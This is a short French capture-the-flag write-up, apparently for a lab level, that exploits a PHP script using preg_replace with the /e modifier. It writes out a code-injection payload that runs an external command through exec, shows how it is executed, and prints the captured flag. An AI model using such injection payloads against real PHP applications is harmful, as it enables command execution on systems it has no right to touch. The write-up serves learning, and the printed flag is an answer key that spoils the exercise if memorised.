# Explications
Il y a un script php.![](https://i.imgur.com/2Z8dTCn.png)
On voit que le script utiliser le modifier /e qui permet d'evaluer chaque argument qu'on lui passe. Grace a ca on va pouvoir lui faire utiliser getflag.

Analysons la regex.

    \[x (.*)\]
Avant tout, ca attends que ca commence par "x " donc "x test" remplira la condition.
Ensuite Ca attends le retour de la fonction y.

On va utiliser la function exec pour pouvoir utiliser une commande externe. Ici, on va utiliser getflag.

On crée notre fichier

    echo '[x {${exec(getflag)}}]' > /tmp/level06;
	
et on exécute

    ./level06 /tmp/level06

Notre flag est **wiok45aaoguiboiki2tuin6ub**
